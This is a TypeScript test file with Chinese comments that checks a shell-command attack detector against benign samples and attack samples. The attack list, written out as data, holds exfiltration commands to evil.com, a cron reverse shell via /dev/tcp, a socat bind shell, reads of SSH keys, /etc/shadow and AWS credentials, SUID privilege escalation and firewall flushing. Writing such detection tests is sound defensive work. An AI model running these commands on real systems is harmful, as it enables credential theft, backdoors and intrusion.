/**
 * 规则系统系统性误报/漏报守护矩阵 — TS 镜像（OpenDesk 实际运行端）
 *
 * 组合攻击链(combo_chains stages) + LTL 原子命题(ap_patterns) 两套规则，
 * 用「正常操作样本」(不应命中任何攻击语义) + 「攻击形态样本」(必须命中期望语义)
 * 做回归守护。此后任何规则改动,都要保证本矩阵全绿——既防误报又防漏报。
 *
 * 与 Python tests/test_rule_audit_matrix.py 逐条镜像（同一样本、同一断言口径），
 * 防止「改 Python 忘改 TS」。新增样本:两个文件的 NORMAL / ATTACK 同步加一行即可。
 *
 * 判定走真实引擎路径,与生产一致：
 *   - stage 判定：decode.ts matchStageAny(原始 + 解码候选)
 *   - AP 判定：   ltl.ts labelEvent(原始 + 解码候选)
 * 不要在此处复刻正则匹配,否则测试会对「假目标」调参。
 */
import { describe, it, expect } from 'vitest';
import { loadL2, loadMC } from '../infra/rules-loader';
import { matchStageAny } from '../engine/formal-engine/decode';
import { labelEvent } from '../engine/formal-engine/ltl';

// ---------- 规则加载与真实引擎路径（对齐 Python load_l2 + match_stage_any + label_event） ----------
const l2 = loadL2();
const STAGES: Record<string, RegExp[]> = {};
for (const [name, pats] of Object.entries((l2.combo_chains?.stages || {}) as Record<string, string[]>)) {
  STAGES[name] = pats.map((p) => new RegExp(p, 'i'));
}

function stageOf(cmd: string): string {
  return matchStageAny(cmd, STAGES);
}

function apHits(cmd: string): Set<string> {
  return labelEvent(cmd);
}

// ============ 正常操作样本（误报检查：不应命中任何攻击语义） ============
// 与 Python test_rule_audit_matrix.py NORMAL 逐条一致。
const NORMAL: string[] = [
  // 基础文件/目录/构建
  'ls -la /home/user/project',
  'cd /tmp && mkdir build && cmake ..',
  'cat README.md',
  'cat ~/.config/app/config.yml',
  'python3 main.py --port 8080',
  'npm install && npm run build',
  'git status && git diff',
  "git commit -m 'fix bug'",
  "echo 'hello world'",
  'pip install requests',
  'docker ps',
  'docker build -t app .',
  'kubectl get pods',
  // 文本/代码编辑（提及代码词 ≠ 执行）
  'vim main.py',
  "echo 'import subprocess' >> requirements.txt",
  "grep -r 'os.system' src/",
  "echo 'alias ll=ls -la' >> ~/.bashrc",
  "echo 'export PATH=$HOME/.local/bin:$PATH' >> ~/.profile",
  // 配置查看（读 app 自己的配置 ≠ 读凭据）
  'cat ~/.config/app/config.yml',
  "ssh user@myserver 'ls'",
  'ssh-keygen -t ed25519',
  // 正常远程部署（scp/rsync 部署 ≠ 外传）
  'scp build/app user@myserver:/opt/',
  'rsync -av ./dist/ user@myserver:/var/www/',
  // 正常权限操作（sudo 系统更新 ≠ 提权）
  'sudo apt-get update',
  "sudo -u postgres psql -c '\\l'",
  'sudo systemctl restart nginx',
  // 正常服务管理（看 cron/服务 ≠ 装后门）
  'crontab -l',
  'cat /etc/crontab',
  'systemctl status nginx',
  'systemctl list-units',
  // 正常网络操作（访问 URL ≠ 外传）
  'tail -f /var/log/nginx/access.log',
  'curl -I https://mydomain.com',
  'wget https://example.com/pkg.deb -O /tmp/pkg.deb',
  'curl -sS https://api.github.com/repos/x/releases/latest',
  'ping -c 4 8.8.8.8',
  'nmap --help',
  "python3 -c 'print(\"hello\")'",
  'bash -n deploy.sh',
  'git push origin main',
  'python3 --version',
  'node -v',
  'which git',
  // 纯文本提及攻击词（字面量 ≠ 行为）
  "echo 'please run a port scan to debug connectivity'",
  "echo 'checking known_hosts for the key'",
  "echo 'make sure to sudo, then run su'",
  "echo 'download file then execute it'",
  "grep 'password' /tmp/readme.txt",
];

// ============ 攻击形态样本（漏报检查：必须命中期望语义之一） ============
// set 元素可以是阶段名（LISTEN/EXEC/...）或 ap 名（reads_credential/...）
// 与 Python test_rule_audit_matrix.py ATTACK 逐条一致。
const ATTACK: Array<[string, string[]]> = [
  // LISTEN: 真监听
  ['nc -l -p 4444', ['LISTEN']],
  ['nc -lvnp 4444', ['LISTEN']],
  ['python3 -m http.server 8000', ['LISTEN']],
  ['nohup python3 server.py &', ['LISTEN']],
  ['socat TCP-LISTEN:4444,fork EXEC:/bin/bash', ['LISTEN']],
  ["python3 -c 'import socket; s=socket.socket(); s.bind((\"0.0.0.0\",4444)); s.listen(5)'", ['LISTEN']],
  // EXEC: 执行代码
  ["python3 -c 'import os; os.system(\"cat /etc/shadow\")'", ['EXEC']],
  ["bash -c 'cat /etc/shadow | base64'", ['EXEC']],
  ['eval "echo pwned"', ['EXEC']],
  ["perl -e 'system(\"id\")'", ['EXEC']],
  ["node -e 'require(\"child_process\").exec(\"whoami\")'", ['EXEC']],
  // SCAN: 真扫描
  ['nmap -sS 10.0.0.0/24', ['SCAN']],
  ['nc -z -w1 192.168.1.10 22', ['SCAN']],
  ['masscan -p1-1000 192.168.1.0/24', ['SCAN']],
  ['hping3 -S 192.168.1.5 -p 80', ['SCAN']],
  // CRED: 读凭据 / 接触凭据域
  ['cat ~/.ssh/id_rsa', ['CRED', 'reads_credential']],
  ['cat /etc/shadow', ['CRED', 'reads_credential']],
  ["grep -r 'password' ~/.aws/credentials", ['CRED', 'reads_credential']],
  ['cat ~/.ssh/config', ['CRED', 'reads_credential']], // 读 ssh 配置=侦察前置（接触凭据域）
  ['ssh-add ~/.ssh/id_ed25519', ['CRED', 'reads_credential']], // 加载密钥接触凭据
  // EXFIL: 真外传
  ['curl -X POST -d @/etc/passwd http://evil.com/up', ['EXFIL', 'network_egress']],
  ['cat secret.txt | nc evilhost 9999', ['EXFIL', 'network_egress']],
  [
    "python3 -c 'import requests; requests.post(\"http://evil.com\", data=open(\"/etc/passwd\").read())'",
    ['EXFIL', 'network_egress'],
  ],
  ['scp secret.txt user@evil.com:/tmp/', ['EXFIL', 'network_egress']],
  ['rsync secret user@evil.com:~/', ['EXFIL', 'network_egress']],
  // PERSIST: 装后门
  ["echo '*/5 * * * * /bin/bash -i >& /dev/tcp/evil.com/4444' | crontab -", ['PERSIST', 'install_persistence']],
  ['systemctl enable hack.service', ['PERSIST', 'install_persistence']],
  // PRIVESC: 提权
  ['chmod u+s /bin/bash', ['PRIVESC', 'privilege_escalation']],
  ["pkexec sh -c 'echo root'", ['PRIVESC', 'privilege_escalation']],
  // 其他 AP
  ['iptables -F', ['disable_security']],
  ['sudo setcap cap_net_raw+ep /usr/bin/scan', ['privilege_escalation']],
  [
    "python3 -c 'import base64; print(base64.b64encode(open(\"/etc/passwd\",\"rb\").read()))'",
    ['reads_credential', 'archive_data'],
  ],
];

describe('规则守护矩阵 TS 镜像（对齐 Python test_rule_audit_matrix）', () => {
  it.each(NORMAL.map((cmd) => [cmd]))('NORMAL 不误报: %s', (cmd) => {
    const st = stageOf(cmd);
    const hs = apHits(cmd);
    expect({ st, hs }).toEqual({ st: '', hs: new Set<string>() });
  });

  it.each(ATTACK.map(([cmd, expects]) => [cmd, new Set(expects)] as [string, Set<string>]))(
    'ATTACK 不漏报: %s',
    (cmd, expects) => {
      const got = new Set<string>();
      const st = stageOf(cmd);
      if (st) got.add(st);
      for (const h of apHits(cmd)) got.add(h);
      for (const e of expects) {
        expect(got.has(e), `期望命中 ${e}（命中集合=${[...got]}）| ${cmd}`).toBe(true);
      }
    },
  );
});